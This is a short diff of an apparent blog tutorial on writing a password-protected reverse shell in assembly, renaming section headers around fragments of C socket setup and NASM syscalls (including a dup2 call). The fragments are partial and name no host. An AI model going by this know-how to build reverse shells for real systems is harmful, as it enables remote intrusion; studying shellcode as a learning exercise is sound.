@@ -199,7 +199,7 @@ mov rdi, rax ;store file descriptor that is returned by the syscall in rdi for f
 
 Again, if the block of code above makes no sense to you then go and read the previous blogposts first.
 
-<h3>Initiate the connection back to remote server</h3>
+<h3>Stage 2 - Initiate the connection back to remote server</h3>
 
 ```c
 server.sin_family = AF_INET; //Address Family
@@ -250,6 +250,8 @@ mov rax, 33
 mov rsi, 2
 syscall
 ```
+
+<h3>Stage 4 - Wait for input (password) to be received and compare it against the correct password string</h3>
 
 ```nasm
 
